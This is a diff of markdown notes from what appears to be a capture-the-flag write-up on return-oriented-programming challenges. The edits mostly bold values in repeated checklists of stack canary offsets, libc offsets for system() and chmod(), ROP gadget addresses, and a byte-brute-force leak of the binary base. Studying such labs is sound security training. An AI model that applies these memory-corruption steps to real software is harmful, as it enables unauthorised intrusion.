-   - Offset of `system()` within Libc: `0x52290`
-   - Offset of `chmod()` within Libc: `0x10dd80`
+   - Offset of `system()` within Libc: **`0x52290`**
+   - Offset of `chmod()` within Libc: **`0x10dd80`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x23b6a`
-   - `pop rsi ; ret`: `0x2601f`
+   - `pop rdi ; ret`: **`0x23b6a`**
+   - `pop rsi ; ret`: **`0x2601f`**
 
 ### Leaking Libc base
 
@@ -12662,9 +12664,9 @@ Breakpoint hit at 0x641a475e0a4a
 ```
 
 - [ ] Offset between buffer and stack canary
-   - Location of the buffer: `0x7ffcf1340c70`
+   - Location of the buffer: **`0x7ffcf1340c70`**
 - [ ] Offset between buffer and stored return address
-   - Location of the buffer: `0x7ffcf1340c70`
+   - Location of the buffer: **`0x7ffcf1340c70`**
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 
@@ -12688,12 +12690,12 @@ pwndbg> p/d 0x7ffcf1340cf8 - 0x7ffcf1340c70
 $2 = 136
 ```
 
-- [x] Offset between buffer and stack canary: `120`
-   - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the canary: `0x7ffcf1340cf0 - 8` = `0x7ffcf1340ce8`
-- [x] Offset between buffer and stored return address: `136`
-   - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the stored return address: `0x7ffcf1340cf8`
+- [x] Offset between buffer and stack canary: **`120`**
+   - Location of the buffer: **`0x7ffcf1340c70`**
+   - Location of the canary: **`0x7ffcf1340cf0 - 8` = `0x7ffcf1340ce8`**
+- [x] Offset between buffer and stored return address: **`136`**
+   - Location of the buffer: **`0x7ffcf1340c70`**
+   - Location of the stored return address: **`0x7ffcf1340cf8`**
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 
@@ -12714,16 +12716,16 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ ROPgadget --binary /l
 0x000000000002601f : pop rsi ; ret
 ```
 
-- [x] Offset between buffer and stack canary: `72`
-   - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffcf1340ce8`
-- [x] Offset between buffer and stored return address: `88`
-   - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the stored return address: `0x7ffcf1340cf8`
+- [x] Offset between buffer and stack canary: **`120`**
+   - Location of the buffer: **`0x7ffcf1340c70`**
+   - Location of the canary: **`0x7ffcf1340cf0 - 8` = `0x7ffcf1340ce8`**
+- [x] Offset between buffer and stored return address: **`136`**
+   - Location of the buffer: **`0x7ffcf1340c70`**
+   - Location of the stored return address: **`0x7ffcf1340cf8`**
 - [ ] Offsets of required Libc functions
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x23b6a`
-   - `pop rsi ; ret`: `0x2601f`
+   - `pop rdi ; ret`: **`0x23b6a`**
+   - `pop rsi ; ret`: **`0x2601f`**
 
 ### Libc functions
 
@@ -12734,17 +12736,17 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_6
   1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
 ```
 
-- [x] Offset between buffer and stack canary: `72`
-   - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffcf1340ce8`
-- [x] Offset between buffer and stored return address: `88`
-   - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the stored return address: `0x7ffcf1340cf8`
+- [x] Offset between buffer and stack canary: **`120`**
+   - Location of the buffer: **`0x7ffcf1340c70`**
+   - Location of the canary: **`0x7ffcf1340cf0 - 8` = `0x7ffcf1340ce8`**
+- [x] Offset between buffer and stored return address: **`136`**
+   - Location of the buffer: **`0x7ffcf1340c70`**
+   - Location of the stored return address: **`0x7ffcf1340cf8`**
 - [ ] Offsets of required Libc functions
-   - Offset of `system()` within Libc: `0x52290`
+   - Offset of `system()` within Libc: **`0x52290`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x23b6a`
-   - `pop rsi ; ret`: `0x2601f`
+   - `pop rdi ; ret`: **`0x23b6a`**
+   - `pop rsi ; ret`: **`0x2601f`**
 
 Now that we can calculate the Libc base address given the leak, let's find the offset of the `chmod()` function within Libc.
 
@@ -12756,18 +12758,18 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_6
   2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
 ```
 
-- [x] Offset between buffer and stack canary: `72`
-   - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffcf1340ce8`
-- [x] Offset between buffer and stored return address: `88`
-   - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the stored return address: `0x7ffcf1340cf8`
+- [x] Offset between buffer and stack canary: **`120`**
+   - Location of the buffer: **`0x7ffcf1340c70`**
+   - Location of the canary: **`0x7ffcf1340cf0 - 8` = `0x7ffcf1340ce8`**
+- [x] Offset between buffer and stored return address: **`136`**
+   - Location of the buffer: **`0x7ffcf1340c70`**
+   - Location of the stored return address: **`0x7ffcf1340cf8`**
 - [x] Offsets of required Libc functions
-   - Offset of `system()` within Libc: `0x52290`
-   - Offset of `chmod()` within Libc: `0x10dd80`
+   - Offset of `system()` within Libc: **`0x52290`**
+   - Offset of `chmod()` within Libc: **`0x10dd80`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x23b6a`
-   - `pop rsi ; ret`: `0x2601f`
+   - `pop rdi ; ret`: **`0x23b6a`**
+   - `pop rsi ; ret`: **`0x2601f`**
 
 ### Leaking Libc base
 
@@ -13117,9 +13119,9 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ```
 
 - [ ] Offset between buffer and stack canary
-   - Location of the buffer: `0x7ffdccee6250`
+   - Location of the buffer: **`0x7ffdccee6250`**
 - [ ] Offset between buffer and stored return
-   - Location of the buffer: `0x7ffdccee6250`
+   - Location of the buffer: **`0x7ffdccee6250`**
 - [ ] Location of the PLT entry of `puts@plt`
 - [ ] Location of the GOT entry of `puts@got`
 - [ ] Offsets of required Libc functions
@@ -13145,12 +13147,12 @@ pwndbg> p/d 0x7ffdccee6298 - 0x7ffdccee6250
 $2 = 72
 ```
 
-- [x] Offset between buffer and stack canary: `56`
-   - Location of the buffer: `0x7ffdccee6250`
-   - Location of the canary: `0x7ffdccee6290 - 8` = `0x7ffdccee6288`
+- [x] Offset between buffer and stack canary: **`56`**
+   - Location of the buffer: **`0x7ffdccee6250`**
+   - Location of the canary: **`0x7ffdccee6290 - 8` = `0x7ffdccee6288`**
 - [x] Offset between buffer and stored return address to
-   - Location of the buffer: `0x7ffdccee6250`
-   - Location of the stored return address: `0x7ffdccee6298`
+   - Location of the buffer: **`0x7ffdccee6250`**
+   - Location of the stored return address: **`0x7ffdccee6298`**
 - [ ] Location of the PLT entry of `puts@plt`
 - [ ] Location of the GOT entry of `puts@got`
 - [ ] Offsets of required Libc functions
@@ -13165,16 +13167,16 @@ hacker@return-oriented-programming~rop-roulette-easy:~$ python3 -c "from pwn imp
 puts@plt: 0x11d4 puts@got: 0x4f30
 ```
 
-- [x] Offset between buffer and stack canary: `56`
-   - Location of the buffer: `0x7ffdccee6250`
-   - Location of the canary: `0x7ffdccee6290 - 8` = `0x7ffdccee6288`
+- [x] Offset between buffer and stack canary: **`56`**
+   - Location of the buffer: **`0x7ffdccee6250`**
+   - Location of the canary: **`0x7ffdccee6290 - 8` = `0x7ffdccee6288`**
 - [x] Offset between buffer and stored return address to
-   - Location of the buffer: `0x7ffdccee6250`
-   - Location of the stored return address: `0x7ffdccee6298`
+   - Location of the buffer: **`0x7ffdccee6250`**
+   - Location of the stored return address: **`0x7ffdccee6298`**
 - [ ] Location of the PLT entry of `puts@plt`
-   - Offset of `puts@plt` within the binary: `0x11d4`
+   - Offset of `puts@plt` within the binary: **`0x11d4`**
 - [ ] Location of the GOT entry of `puts@got`: 
-   - Offset of `puts@got` within the binary: `0x4f30`
+   - Offset of `puts@got` within the binary: **`0x4f30`**
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 - [ ] Offset of NULL terminated string `"!\x00"` string within Libc
@@ -13202,23 +13204,21 @@ hacker@return-oriented-programming~rop-roulette-easy:~$ ROPgadget --binary /lib/
 0x000000000002601f : pop rsi ; ret
 ```
 
-- [x] Offset between buffer and stack canary: `56`
-   - Location of the buffer: `0x7ffdccee6250`
-   - Location of the canary: `0x7ffdccee6288`
-- [x] Offset between buffer and stored return address: `72`
-   - Location of the buffer: `0x7ffdccee6250`
-   - Location of the stored return address: `0x7ffdccee6298`
+- [x] Offset between buffer and stack canary: **`56`**
+   - Location of the buffer: **`0x7ffdccee6250`**
+   - Location of the canary: **`0x7ffdccee6290 - 8` = `0x7ffdccee6288`**
+- [x] Offset between buffer and stored return address to
+   - Location of the buffer: **`0x7ffdccee6250`**
+   - Location of the stored return address: **`0x7ffdccee6298`**
 - [ ] Location of the PLT entry of `puts@plt`
-   - Offset of `puts@plt` within the binary: `0x11d4`
+   - Offset of `puts@plt` within the binary: **`0x11d4`**
 - [ ] Location of the GOT entry of `puts@got`: 
-   - Offset of `puts@got` within the binary: `0x4f30`
+   - Offset of `puts@got` within the binary: **`0x4f30`**
 - [ ] Offsets of required Libc functions
 - [x] Locations of required ROP gadgets
-   - Binary: `pop rdi ; ret`: `0x2b63`
-   - Binary: `puts@plt`: `0x11d4`
-   - Binary: `puts@got`: `0x4f30`
-   - Libc: `pop rdi ; ret`: `0x23b6a`
-   - Libc: `pop rsi ; ret`: `0x2601f`
+   - Binary: `pop rdi ; ret`: **`0x2b63`**
+   - Libc: `pop rdi ; ret`: **`0x23b6a`**
+   - Libc: `pop rsi ; ret`: **`0x2601f`**
 - [ ] Offset of NULL terminated string `"!\x00"` string within Libc
 
 ### Libc functions
@@ -13245,25 +13245,25 @@ hacker@return-oriented-programming~rop-roulette-easy:~$ python3 -c "d=open('/lib
 0x2a32
 ```
 
-- [x] Offset between buffer and stack canary: `56`
-   - Location of the buffer: `0x7ffdccee6250`
-   - Location of the canary: `0x7ffdccee6288`
-- [x] Offset between buffer and stored return address: `72`
-   - Location of the buffer: `0x7ffdccee6250`
-   - Location of the stored return address: `0x7ffdccee6298`
+- [x] Offset between buffer and stack canary: **`56`**
+   - Location of the buffer: **`0x7ffdccee6250`**
+   - Location of the canary: **`0x7ffdccee6290 - 8` = `0x7ffdccee6288`**
+- [x] Offset between buffer and stored return address to
+   - Location of the buffer: **`0x7ffdccee6250`**
+   - Location of the stored return address: **`0x7ffdccee6298`**
 - [ ] Location of the PLT entry of `puts@plt`
-   - Offset of `puts@plt` within the binary: `0x11d4`
+   - Offset of `puts@plt` within the binary: **`0x11d4`**
 - [ ] Location of the GOT entry of `puts@got`: 
-   - Offset of `puts@got` within the binary: `0x4f30`
+   - Offset of `puts@got` within the binary: **`0x4f30`**
 - [x] Offsets of required Libc functions
-   - Offset of `system()` within Libc: `0x52290`
-   - Offset of `chmod()` within Libc: `0x10dd80`
-   - Offset of `puts()` within Libc: `0x84420`
+   - Offset of `system()` within Libc: **`0x52290`**
+   - Offset of `chmod()` within Libc: **`0x10dd80`**
+   - Offset of `puts()` within Libc: **`0x84420`**
 - [x] Locations of required ROP gadgets
-   - Binary: `pop rdi ; ret`: `0x2b63`
-   - Libc: `pop rdi ; ret`: `0x23b6a`
-   - Libc: `pop rsi ; ret`: `0x2601f`
-- [x] Offset of NULL terminated string `"!\x00"` string within Libc: `0x2a32`
+   - Binary: `pop rdi ; ret`: **`0x2b63`**
+   - Libc: `pop rdi ; ret`: **`0x23b6a`**
+   - Libc: `pop rsi ; ret`: **`0x2601f`**
+- [x] Offset of NULL terminated string `"!\x00"` string within Libc: **`0x2a32`**
 
 
 ### Leaking binary base
@@ -13295,25 +13295,25 @@ By brute-forcing bytes 1–5 with the `### Goodbye!` oracle, the same oracle use
 binary_base = saved_rip - 0x2ad3
 ```
 
-- [x] Offset between buffer and stack canary: `56`
-   - Location of the buffer: `0x7ffdccee6250`
-   - Location of the canary: `0x7ffdccee6288`
-- [x] Offset between buffer and stored return address: `72`
-   - Location of the buffer: `0x7ffdccee6250`
-   - Location of the stored return address: `0x7ffdccee6298`
-- [x] Location of the PLT entry of `puts@plt`: leaked `binary_base` + `0x11d4`
-   - Offset of `puts@plt` within the binary: `0x11d4`
-- [x] Location of the GOT entry of `puts@got`: leaked `binary_base` + `0x4f30`
-   - Offset of `puts@got` within the binary: `0x4f30`
+- [x] Offset between buffer and stack canary: **`56`**
+   - Location of the buffer: **`0x7ffdccee6250`**
+   - Location of the canary: **`0x7ffdccee6288`**
+- [x] Offset between buffer and stored return address: **`72`**
+   - Location of the buffer: **`0x7ffdccee6250`**
+   - Location of the stored return address: **`0x7ffdccee6298`**
+- [x] Location of the PLT entry of `puts@plt`: **leaked `binary_base` + `0x11d4`**
+   - Offset of `puts@plt` within the binary: **`0x11d4`**
+- [x] Location of the GOT entry of `puts@got`: **leaked `binary_base` + `0x4f30`**
+   - Offset of `puts@got` within the binary: **`0x4f30`**
 - [x] Offsets of required Libc functions
-   - Offset of `system()` within Libc: `0x52290`
-   - Offset of `chmod()` within Libc: `0x10dd80`
-   - Offset of `puts()` within Libc: `0x84420`
+   - Offset of `system()` within Libc: **`0x52290`**
+   - Offset of `chmod()` within Libc: **`0x10dd80`**
+   - Offset of `puts()` within Libc: **`0x84420`**
 - [x] Locations of required ROP gadgets
-   - Binary: `pop rdi ; ret`: `0x2b63`
-   - Libc: `pop rdi ; ret`: `0x23b6a`
-   - Libc: `pop rsi ; ret`: `0x2601f`
-- [x] Offset of NULL terminated string `"!\x00"` string within Libc: `0x2a32`
+   - Binary: `pop rdi ; ret`: **`0x2b63`**
+   - Libc: `pop rdi ; ret`: **`0x23b6a`**
+   - Libc: `pop rsi ; ret`: **`0x2601f`**
+- [x] Offset of NULL terminated string `"!\x00"` string within Libc: **`0x2a32`**
 
 ### Leaking libc base
 
@@ -13910,12 +13910,12 @@ pwndbg> p/d 0x7ffdc145e248 - 0x7ffdc145e1f0
 $2 = 88
 ```
 
-- [x] Offset between buffer and stack canary: `72`
-   - Location of the buffer: `0x7ffdc145e1f0`
-   - Location of the canary: `0x7ffdc145e240 - 8` = `0x7ffdc145e238`
-- [x] Offset between buffer and stored return address: `88`
-   - Location of the buffer: `0x7ffdc145e1f0`
-   - Location of the stored return address: `0x7ffdc145e248`
+- [x] Offset between buffer and stack canary: **`72`**
+   - Location of the buffer: **`0x7ffdc145e1f0`**
+   - Location of the canary: **`0x7ffdc145e240 - 8` = `0x7ffdc145e238`**
+- [x] Offset between buffer and stored return address: **`88`**
+   - Location of the buffer: **`0x7ffdc145e1f0`**
+   - Location of the stored return address: **`0x7ffdc145e248`**
 - [ ] Location of the PLT entry of `puts@plt`
 - [ ] Location of the GOT entry of `puts@got`
 - [ ] Offsets of required Libc functions
@@ -13930,16 +13930,16 @@ hacker@return-oriented-programming~rop-roulette-easy:~$ python3 -c "from pwn imp
 puts@plt: 0x11d4 puts@got: 0x4f30
 ```
 
-- [x] Offset between buffer and stack canary: `72`
-   - Location of the buffer: `0x7ffdc145e1f0`
-   - Location of the canary: `0x7ffdc145e240 - 8` = `0x7ffdc145e238`
-- [x] Offset between buffer and stored return address: `88`
-   - Location of the buffer: `0x7ffdc145e1f0`
-   - Location of the stored return address: `0x7ffdc145e248`
+- [x] Offset between buffer and stack canary: **`72`**
+   - Location of the buffer: **`0x7ffdc145e1f0`**
+   - Location of the canary: **`0x7ffdc145e240 - 8` = `0x7ffdc145e238`**
+- [x] Offset between buffer and stored return address: **`88`**
+   - Location of the buffer: **`0x7ffdc145e1f0`**
+   - Location of the stored return address: **`0x7ffdc145e248`**
 - [ ] Location of the PLT entry of `puts@plt`
-   - Offset of `puts@plt` within the binary: `0x1154`
+   - Offset of `puts@plt` within the binary: **`0x1154`**
 - [ ] Location of the GOT entry of `puts@got`
-   - Offset of `puts@got` within the binary: `0x3f60`
+   - Offset of `puts@got` within the binary: **`0x3f60`**
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 - [ ] Offset of NULL terminated string `"!\x00"` string within Libc
@@ -13965,21 +13965,21 @@ hacker@return-oriented-programming~rop-roulette-hard:~$ ROPgadget --binary /lib/
 0x000000000002601f : pop rsi ; ret
 ```
 
-- [x] Offset between buffer and stack canary: `72`
-   - Location of the buffer: `0x7ffdc145e1f0`
-   - Location of the canary: `0x7ffdc145e240 - 8` = `0x7ffdc145e238`
-- [x] Offset between buffer and stored return address: `88`
-   - Location of the buffer: `0x7ffdc145e1f0`
-   - Location of the stored return address: `0x7ffdc145e248`
+- [x] Offset between buffer and stack canary: **`72`**
+   - Location of the buffer: **`0x7ffdc145e1f0`**
+   - Location of the canary: **`0x7ffdc145e240 - 8` = `0x7ffdc145e238`**
+- [x] Offset between buffer and stored return address: **`88`**
+   - Location of the buffer: **`0x7ffdc145e1f0`**
+   - Location of the stored return address: **`0x7ffdc145e248`**
 - [x] Location of the PLT entry of `puts@plt`
-   - Offset of `puts@plt` within the binary: `0x1154`
+   - Offset of `puts@plt` within the binary: **`0x1154`**
 - [x] Location of the GOT entry of `puts@got`
-   - Offset of `puts@got` within the binary: `0x3f60`
+   - Offset of `puts@got` within the binary: **`0x3f60`**
 - [ ] Offsets of required Libc functions
 - [x] Locations of required ROP gadgets
-   - Binary: `pop rdi ; ret`: `0x17b3`
-   - Libc: `pop rdi ; ret`: `0x23b6a`
-   - Libc: `pop rsi ; ret`: `0x2601f`
+   - Binary: `pop rdi ; ret`: **`0x17b3`**
+   - Libc: `pop rdi ; ret`: **`0x23b6a`**
+   - Libc: `pop rsi ; ret`: **`0x2601f`**
 - [ ] Offset of NULL terminated string `"!\x00"` string within Libc
 
 ### Libc functions
@@ -14006,25 +14006,25 @@ hacker@return-oriented-programming~rop-roulette-hard:~$ python3 -c "d=open('/lib
 0x2a32
 ```
 
-- [x] Offset between buffer and stack canary: `72`
-   - Location of the buffer: `0x7ffdc145e1f0`
-   - Location of the canary: `0x7ffdc145e240 - 8` = `0x7ffdc145e238`
-- [x] Offset between buffer and stored return address: `88`
-   - Location of the buffer: `0x7ffdc145e1f0`
-   - Location of the stored return address: `0x7ffdc145e248`
+- [x] Offset between buffer and stack canary: **`72`**
+   - Location of the buffer: **`0x7ffdc145e1f0`**
+   - Location of the canary: **`0x7ffdc145e240 - 8` = `0x7ffdc145e238`**
+- [x] Offset between buffer and stored return address: **`88`**
+   - Location of the buffer: **`0x7ffdc145e1f0`**
+   - Location of the stored return address: **`0x7ffdc145e248`**
 - [x] Location of the PLT entry of `puts@plt`
-   - Offset of `puts@plt` within the binary: `0x1154`
+   - Offset of `puts@plt` within the binary: **`0x1154`**
 - [x] Location of the GOT entry of `puts@got`
-   - Offset of `puts@got` within the binary: `0x3f60`
+   - Offset of `puts@got` within the binary: **`0x3f60`**
 - [x] Offsets of required Libc functions
-   - Offset of `system()` within Libc: `0x52290`
-   - Offset of `chmod()` within Libc: `0x10dd80`
-   - Offset of `puts()` within Libc: `0x84420`
+   - Offset of `system()` within Libc: **`0x52290`**
+   - Offset of `chmod()` within Libc: **`0x10dd80`**
+   - Offset of `puts()` within Libc: **`0x84420`**
 - [x] Locations of required ROP gadgets
-   - Binary: `pop rdi ; ret`: `0x17b3`
-   - Libc: `pop rdi ; ret`: `0x23b6a`
-   - Libc: `pop rsi ; ret`: `0x2601f`
-- [x] Offset of NULL terminated string `"!\x00"` string within Libc: `0x2a32`
+   - Binary: `pop rdi ; ret`: **`0x17b3`**
+   - Libc: `pop rdi ; ret`: **`0x23b6a`**
+   - Libc: `pop rsi ; ret`: **`0x2601f`**
+- [x] Offset of NULL terminated string `"!\x00"` string within Libc: **`0x2a32`**
 
 ### Leaking binary base
 
@@ -14054,25 +14054,25 @@ By brute-forcing bytes 1–5 with the `### Goodbye!` oracle, the same oracle use
 binary_base = saved_rip - 0x1726
 ```
 
-- [x] Offset between buffer and stack canary: `72`
-   - Location of the buffer: `0x7ffdc145e1f0`
-   - Location of the canary: `0x7ffdc145e240 - 8` = `0x7ffdc145e238`
-- [x] Offset between buffer and stored return address: `88`
-   - Location of the buffer: `0x7ffdc145e1f0`
-   - Location of the stored return address: `0x7ffdc145e248`
-- [x] Location of the PLT entry of `puts@plt`: leaked `binary_base` + `0x1154`
-   - Offset of `puts@plt` within the binary: `0x1154`
-- [x] Location of the GOT entry of `puts@got`: leaked `binary_base` + `0x3f60`
-   - Offset of `puts@got` within the binary: `0x3f60`
+- [x] Offset between buffer and stack canary: **`72`**
+   - Location of the buffer: **`0x7ffdc145e1f0`**
+   - Location of the canary: **`0x7ffdc145e240 - 8` = `0x7ffdc145e238`**
+- [x] Offset between buffer and stored return address: **`88`**
+   - Location of the buffer: **`0x7ffdc145e1f0`**
+   - Location of the stored return address: **`0x7ffdc145e248`**
+- [x] Location of the PLT entry of `puts@plt`: **leaked `binary_base` + `0x1154`**
+   - Offset of `puts@plt` within the binary: **`0x1154`**
+- [x] Location of the GOT entry of `puts@got`: **leaked `binary_base` + `0x3f60`**
+   - Offset of `puts@got` within the binary: **`0x3f60`**
 - [x] Offsets of required Libc functions
-   - Offset of `system()` within Libc: `0x52290`
-   - Offset of `chmod()` within Libc: `0x10dd80`
-   - Offset of `puts()` within Libc: `0x84420`
+   - Offset of `system()` within Libc: **`0x52290`**
+   - Offset of `chmod()` within Libc: **`0x10dd80`**
+   - Offset of `puts()` within Libc: **`0x84420`**
 - [x] Locations of required ROP gadgets
-   - Binary: `pop rdi ; ret`: `0x17b3`
-   - Libc: `pop rdi ; ret`: `0x23b6a`
-   - Libc: `pop rsi ; ret`: `0x2601f`
-- [x] Offset of NULL terminated string `"!\x00"` string within Libc: `0x2a32`
+   - Binary: `pop rdi ; ret`: **`0x17b3`**
+   - Libc: `pop rdi ; ret`: **`0x23b6a`**
+   - Libc: `pop rsi ; ret`: **`0x2601f`**
+- [x] Offset of NULL terminated string `"!\x00"` string within Libc: **`0x2a32`**
 
 ### Leaking libc base
 
